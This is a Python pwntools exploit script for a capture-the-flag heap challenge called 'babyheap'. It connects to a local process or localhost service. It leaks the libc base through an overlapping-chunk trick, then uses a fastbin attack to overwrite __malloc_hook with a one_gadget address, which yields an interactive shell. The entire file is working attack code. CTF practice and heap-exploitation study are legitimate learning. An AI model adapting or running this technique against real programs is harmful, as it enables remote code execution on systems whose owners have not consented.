#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./babyheap"
libcPath = "./libc.so.6"
remoteAddr = "localhost"
remotePort = 9999

context.log_level = "debug"
context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    main_arena = 0x399b00
    one_gadget = 0x3f32a

else:
    main_arena = 0x3c4b20
    one_gadget = 0x4526a
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def alloc(size, cont):
    io.sendlineafter(": ", "1")
    io.sendlineafter(": ", str(size))
    io.sendafter(": ", cont)

def show(idx):
    io.sendlineafter(": ", "2")
    io.sendlineafter(": ", str(idx))
 
def delete(idx):
    io.sendlineafter(": ", "3")
    io.sendlineafter(": ", str(idx))
    
if __name__ == "__main__":
    alloc(0x100, 'a' * 0x100) 
    alloc(0x78, 'b' * 0x78)   
    alloc(0xf0, 'c' * 0xf0)   
    alloc(0x40, 'd' * 0x40)   
    delete(0)
    delete(1)

    alloc(0x78, 'e' * 0x70 + p64(0x190))
    #  DEBUG([0xD3E, 0xF25, 0xE97], True)
    delete(2)
    alloc(0x100, 'f' * 0x100) # 1
    show(0)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - main_arena
    success("libc", libc.address)

    #  DEBUG([0xD3E, 0xF25, 0xE97], True)
    delete(1)
    alloc(0x90, 'g' * 0x90)     
    alloc(0x60, 'h' * 0x60)     
    alloc(0x60, 'i' * 0x60)     

    delete(4)
    delete(2)
    delete(0)

    #  DEBUG([0xD3E, 0xF25, 0xE97], True)
    alloc(0x60, p64(libc.sym["__malloc_hook"] - 0x23).ljust(0x60, '\0'))
    alloc(0x60, 'j' * 0x60)
    alloc(0x60, 'k' * 0x60)
    alloc(0x60, '\0' * 0x13 + p64(libc.address + one_gadget) + '\n')

    io.sendlineafter(": ", "1")
    io.sendlineafter(": ", str(0x10))
    
    io.interactive()
    io.close()


